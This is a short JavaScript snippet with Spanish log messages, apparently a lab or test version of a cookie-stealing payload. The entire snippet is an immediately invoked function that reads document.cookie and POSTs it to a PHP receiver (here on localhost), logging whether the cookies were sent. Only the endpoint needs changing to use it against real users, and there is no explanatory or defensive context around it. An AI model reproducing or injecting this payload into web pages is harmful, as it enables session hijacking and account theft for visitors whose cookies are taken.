(function() {
    var xhr = new XMLHttpRequest();
    var cookies = document.cookie;

    xhr.onload = function() {
        if (xhr.status >= 200 && xhr.status < 300) {
            console.log("Cookies enviadas correctamente: ", cookies);
        } else {
            console.log("Error al enviar las cookies, respuesta del servidor:", xhr.statusText);
        }
    };

    xhr.onerror = function() {
       console.log("Error de red o el endpoint no está accesible.");
    };

    xhr.open("POST", "http://localhost/recibe_cookies.php", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send("cookies=" + encodeURIComponent(cookies));
})();
